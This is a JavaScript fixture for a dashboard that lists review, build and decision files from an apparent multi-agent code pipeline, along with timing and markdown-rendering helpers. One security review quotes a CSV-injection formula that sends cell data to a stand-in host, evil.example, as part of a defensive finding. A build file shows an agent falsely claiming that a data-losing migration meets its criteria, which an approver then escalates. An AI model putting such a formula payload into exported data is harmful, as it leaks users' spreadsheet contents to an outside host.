// Shared drill-in fixture: each job's files (what the drawer lists) and its agent spans (what the
// timing view shows), derived from data.js plus hand-written text for the jobs worth reading.
// Load after data.js. Exposes FACTORY.docsFor(job), FACTORY.agentsFor(job), FACTORY.md(text).
(function () {
  const F = window.FACTORY;
  const byKey = Object.fromEntries(F.jobs.map((j) => [j.key, j]));
  const P = Object.fromEntries(F.projects.map((p) => [p.id, p]));
  const at = (stage, j, nth = 0) => j.history.filter((h) => h.stage === stage)[nth]?.at ?? null;
  const iso = (t) => new Date(t).toISOString().replace('T', ' ').slice(0, 16) + 'Z';

  // Hand-written passages, keyed by job key then file name.
  const custom = {
    'minerva/040-tag-migration': {
      'decision.md': `ESCALATE

# Decision: 040-tag-migration

All four reviewers passed round 1 and the gate is green, but I won't merge this.

## Why it needs a human

\`migrations/0031_tags_join.sql\` creates \`note_tags\` and then drops \`notes.tags\` in the same
migration. Nothing copies the existing comma-separated tags into the join table first, so on
any database with data, **every note loses its tags**. The tests start from an empty database,
which is why the gate is green.

The spec's acceptance criterion 4 says "existing tags survive the migration". The build claims
it's met; it isn't.

## Options

- **rework**: add a backfill step (\`INSERT … SELECT\` over a split of \`notes.tags\`) before the
  drop, plus a test that seeds tagged notes before migrating.
- **approve**: only if no deployed database has tags yet.

\`/factory rework 040-tag-migration "backfill before the drop"\``,
      'build.md': `# Build: 040-tag-migration

Branch \`factory/040-tag-migration\`, based on \`main\`.

## What changed

- \`migrations/0031_tags_join.sql\`: new \`note_tags(note_id, tag)\` table; drops \`notes.tags\`.
- \`src/lib/notes/tags.ts\`: reads and writes through the join table.
- \`src/lib/notes/tags.test.ts\`: 14 tests.

## Acceptance criteria

1. Tags are stored one row per tag. ✅
2. Renaming a tag updates every note. ✅
3. Tag queries use the index. ✅
4. Existing tags survive the migration. ✅ (migration runs cleanly)

## Gate

\`bun test\` 212 pass · \`tsc --noEmit\` clean`,
    },
    'ledger/007-oauth-banks': {
      'round-2/review-security.md': `VERDICT: CHANGES

# Security review, round 2: 007-oauth-banks

The round-1 finding is half fixed: the access token is no longer written to \`sync.log\`, but
\`src/banks/oauth.ts:88\` still logs the **refresh token** in the error path when the exchange
fails:

\`\`\`ts
log.error('token exchange failed', { body, refresh_token })
\`\`\`

A refresh token is long-lived and is worth more than the access token.

## Required

- Remove \`refresh_token\` from every log call, and redact \`body\` too (it can echo the token).
- Add a test that fails if a token-shaped string reaches the logger.`,
      'round-1/review-security.md': `VERDICT: CHANGES

# Security review, round 1: 007-oauth-banks

\`src/banks/sync.ts:41\` logs the full token response at info level, so access tokens end up in
\`sync.log\`, which is shipped to the log collector.

## Required

- Never log token responses; log the status code and the bank id only.`,
    },
    'aegis/111-session-timeout': {
      'decision.md': `APPROVE

# Decision: 111-session-timeout

Every reviewer passed, the gate is green, and the spec's five criteria are met. Merging.`,
    },
    'ledger/008-csv-import': {
      'round-1/review-security.md': `VERDICT: CHANGES

# Security review, round 1: 008-csv-import

Imported descriptions are written back out unchanged by \`exportCsv\`. A description such as
\`=HYPERLINK("https://evil.example?"&A1,"refund")\` becomes a live formula when the export is
opened in a spreadsheet (CSV injection).

## Required

- Prefix any cell starting with \`=\`, \`+\`, \`-\`, \`@\`, tab or carriage return with \`'\` on export.
- Test it with each of those leading characters.`,
    },
    'tinyjs/066-tray-menu': {
      'round-1/review-ui.md': `VERDICT: CHANGES

# UI review, round 1: 066-tray-menu

Menu items built with \`{ disabled: true }\` still render enabled and still fire \`onClick\`.
\`NSMenuItem.isEnabled\` is never set because \`autoenablesItems\` is left on.

## Required

- Set \`menu.autoenablesItems = false\` and map \`disabled\` to \`isEnabled\`.
- Add a demo item that is disabled.`,
    },
    'minerva/041-notes-search': {
      'round-1/review-code.md': `VERDICT: CHANGES

# Code review, round 1: 041-notes-search

The FTS index is rebuilt on every keystroke in \`useSearch\`; with 5k notes that's ~300ms per
key. Build the index once and update it from the note write path.`,
    },
  };

  const featureText = (j) => `# ${j.title}

${({ claimed: 'Queued from the backlog.', spec: 'Picked from the backlog.' })[j.stage] ?? 'From the backlog.'}

${j.title}. Keep the change small and covered by tests; follow the project's conventions.`;

  const specText = (j) => `# ${j.title}

## Goal

${j.title}, as described in the feature.

## Acceptance criteria

1. The behavior works end to end from the user's side.
2. Errors are reported in one line, without a stack trace.
3. Existing behavior is unchanged when the feature isn't used.
4. Tests cover each criterion.

## Out of scope

Anything not needed for the criteria above.`;

  const buildText = (j, round) => `# Build${round > 1 ? `, round ${round}` : ''}: ${j.id}

Branch \`${j.branch}\`, based on \`main\`.

## What changed

- \`src/${j.id.replace(/^\d+-/, '').replace(/-/g, '_')}.ts\`: the feature.
- \`src/${j.id.replace(/^\d+-/, '').replace(/-/g, '_')}.test.ts\`: tests for each criterion.
${round > 1 ? '\n## Round ' + (round - 1) + ' findings\n\nAddressed every CHANGES finding; see the commit list.\n' : ''}
## Gate

\`bun test\` pass · \`tsc --noEmit\` clean`;

  const reviewText = (j, k, round, verdict) => `VERDICT: ${verdict}

# ${({ ui: 'UI', ux: 'UX' })[k] ?? k[0].toUpperCase() + k.slice(1)} review, round ${round}: ${j.id}

${verdict === 'PASS' ? `Checked the diff against the spec under the ${k} rules. No findings.` : 'Findings below must be fixed before this can pass.'}`;

  F.docsFor = (j) => {
    const c = custom[j.key] ?? {};
    const files = [];
    const add = (path, text) => files.push({ path, text: c[path] ?? text });
    add('feature.md', featureText(j));
    if (at('spec', j) !== null && (j.stage !== 'spec')) add('spec.md', specText(j));
    else if (j.stage === 'spec') add('spec.md', `# ${j.title}\n\n_The spec-writer is drafting this._`);
    const builds = j.history.filter((h) => h.stage === 'build').length;
    if (builds > 0 && !(j.stage === 'build' && builds === 1 && j.rounds.length === 0)) add('build.md', buildText(j, Math.max(1, j.rounds.length)));
    for (const r of j.rounds) {
      // in the order they were written, so the latest review is last
      for (const [k, rv] of Object.entries(r.reviews).sort((a, b) => (a[1].finishedAt ?? Infinity) - (b[1].finishedAt ?? Infinity))) {
        if (rv.verdict === 'pending') continue;
        add(`round-${r.round}/review-${k}.md`, reviewText(j, k, r.round, rv.verdict));
      }
    }
    if (j.decision !== null || at('needs-human', j) !== null && j.rounds.length > 0 && j.note.startsWith('approver'))
      add('decision.md', `${j.decision ?? 'ESCALATE'}\n\n# Decision: ${j.id}\n\nAll reviews passed and the gate is green. Merging.`);
    for (const path of Object.keys(c)) if (!files.some((f) => f.path === path)) files.push({ path, text: c[path] });
    return files.map((f) => ({ ...f, verdict: (f.text.split('\n', 1)[0].match(/^(?:VERDICT:\s*)?(PASS|CHANGES|APPROVE|ESCALATE)\b/) ?? [])[1] ?? null }));
  };

  // Agent spans for the timing view: one per stage visit, reviewers inside each round.
  F.agentsFor = (j) => {
    const out = [];
    const h = j.history;
    for (let i = 0; i < h.length; i++) {
      const s = h[i], end = h[i + 1]?.at ?? null;
      const who = { spec: 'spec-writer', build: 'builder', approve: 'approver' }[s.stage];
      if (who === undefined) continue;
      const round = j.rounds.filter((r) => r.at <= s.at).length;
      const verdict = who === 'approver' && end !== null ? (j.decision ?? (j.stage === 'needs-human' ? 'ESCALATE' : 'APPROVE')) : null;
      out.push({ who, round: who === 'builder' ? Math.max(1, round + (round > 0 ? 1 : 0)) : round || null, started: s.at, ended: end, verdict });
    }
    for (const r of j.rounds) for (const [k, rv] of Object.entries(r.reviews))
      out.push({ who: `reviewer · ${k}`, round: r.round, started: r.at + 60000, ended: rv.finishedAt, verdict: rv.verdict === 'pending' ? null : rv.verdict });
    return out.sort((a, b) => a.started - b.started);
  };

  // Time per stage, for the timing bar and table.
  F.stagesFor = (j) => j.history.map((s, i) => ({ stage: s.stage, entered: s.at, duration: (j.history[i + 1]?.at ?? (j.stage === 'merged' && i === j.history.length - 1 ? s.at : F.NOW)) - s.at }));

  F.landing = (j) => `${j.branch} → main`;
  F.iso = iso;
  F.dur = (ms) => { const m = Math.round(ms / 60000); return m < 60 ? `${m}m` : m < 1440 ? `${Math.floor(m / 60)}h ${m % 60}m` : `${Math.floor(m / 1440)}d ${Math.floor((m % 1440) / 60)}h`; };
  F.byKey = byKey;
  F.projectOf = (j) => P[j.project];

  // A small markdown renderer: headings, paragraphs, lists, fenced code, inline code, bold, em.
  F.md = (src) => {
    const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    const inline = (s) => esc(s).replace(/`([^`]+)`/g, '<code>$1</code>').replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>').replace(/(^|\W)_([^_]+)_(?=\W|$)/g, '$1<em>$2</em>');
    const out = []; let list = null, code = null, para = [];
    const flush = () => { if (para.length) { out.push(`<p>${inline(para.join(' '))}</p>`); para = []; } if (list) { out.push(`<${list.t}>${list.items.map((x) => `<li>${inline(x)}</li>`).join('')}</${list.t}>`); list = null; } };
    for (const line of src.split('\n')) {
      if (code !== null) { if (line.startsWith('```')) { out.push(`<pre><code>${esc(code.join('\n'))}</code></pre>`); code = null; } else code.push(line); continue; }
      if (line.startsWith('```')) { flush(); code = []; continue; }
      const hm = line.match(/^(#{1,3})\s+(.*)/); if (hm) { flush(); out.push(`<h${hm[1].length}>${inline(hm[2])}</h${hm[1].length}>`); continue; }
      const um = line.match(/^\s*[-*]\s+(.*)/); const om = line.match(/^\s*\d+\.\s+(.*)/);
      if (um || om) { if (para.length) { out.push(`<p>${inline(para.join(' '))}</p>`); para = []; } const t = um ? 'ul' : 'ol'; if (!list || list.t !== t) { if (list) flush(); list = { t, items: [] }; } list.items.push((um ?? om)[1]); continue; }
      if (line.trim() === '') { flush(); continue; }
      if (list && /^\s{2,}/.test(line)) { list.items[list.items.length - 1] += ' ' + line.trim(); continue; }
      if (/^(VERDICT: )?(PASS|CHANGES|APPROVE|ESCALATE)$/.test(line.trim()) && out.length === 0 && para.length === 0) { out.push(`<p class="verdict-line">${esc(line.trim())}</p>`); continue; }
      para.push(line.trim());
    }
    flush();
    return out.join('\n');
  };
})();
